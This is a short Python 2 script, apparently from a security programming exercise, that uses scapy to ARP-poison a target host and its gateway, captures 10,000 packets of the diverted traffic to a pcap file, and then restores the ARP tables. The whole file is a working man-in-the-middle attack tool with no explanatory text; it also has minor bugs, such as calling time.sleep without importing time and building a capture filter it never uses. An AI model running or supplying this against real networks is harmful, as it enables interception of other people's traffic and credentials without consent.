from scapy.all import *
import os
import sys
import threading
import signal

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
	# slightly different method using send
	print "[*] Restoring target..."
	send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=gateway_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
	send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac, hwdst="ff:ff:ff:ff:ff:ff"), count=5)
	# signal the main thread to exit
	# os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
	# return the MAC address from a response
	for s, r in responses:
		return r[Ether].src
	return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	poison_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
	poison_gateway = ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
	print "[*] Beginning the ARP poison. [CTRL-C to stop]"

	while True:
		send(poison_target)
		send(poison_gateway)

		time.sleep(2)

interface = "eth0"
target_ip = "192.168.222.128"
gateway_ip = "192.168.222.2"
packet_count = 10000

# set our interface
conf.iface = interface

# turn off output
conf.verb = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
	print "[!!!] Failed to get gateway MAC. Exiting."
	sys.exit(0)
else:
	print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
	print "[!!!] Failed to get target MAC. Exiting."
	sys.exit(0)
else:
	print "[*] Target %s is at %s" % (target_ip, target_mac)

# start poison thread
poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.setDaemon(True)
poison_thread.start()


print "[*] Starting sniffer for %d packets." % packet_count
bpf_filter = "ip host %s" %target_ip
packets = sniff(count=packet_count, iface=interface)

# write out the captured packets
wrpcap('bph.pcap', packets)

print "[*] Sniffer finished."
restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

	
